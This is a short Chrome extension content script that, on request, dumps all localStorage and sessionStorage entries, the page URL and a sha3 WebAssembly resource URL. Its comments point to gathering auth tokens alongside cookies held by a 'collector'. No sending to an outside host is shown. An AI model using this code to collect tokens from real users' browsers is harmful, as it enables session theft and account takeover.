// Reads page stores for the exporter. Token lives in localStorage, not cookies.

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'readPageStores') {
    sendResponse({ data: dumpPageStores() });
  }
});

function dumpPageStores() {
  const dump = (store) => {
    const out = {};
    try {
      for (let i = 0; i < store.length; i++) {
        const key = store.key(i);
        if (key) out[key] = store.getItem(key) || '';
      }
    } catch {
      // Storage can be blocked on the page; collector still has cookies.
    }
    return out;
  };
  let wasmUrl = '';
  try {
    wasmUrl = performance
      .getEntriesByType('resource')
      .map((r) => r.name)
      .find((n) => /sha3.*\.wasm/i.test(n)) || '';
  } catch {
    wasmUrl = '';
  }
  return {
    href: location.href,
    localStorage: dump(window.localStorage),
    sessionStorage: dump(window.sessionStorage),
    wasmUrl,
  };
}
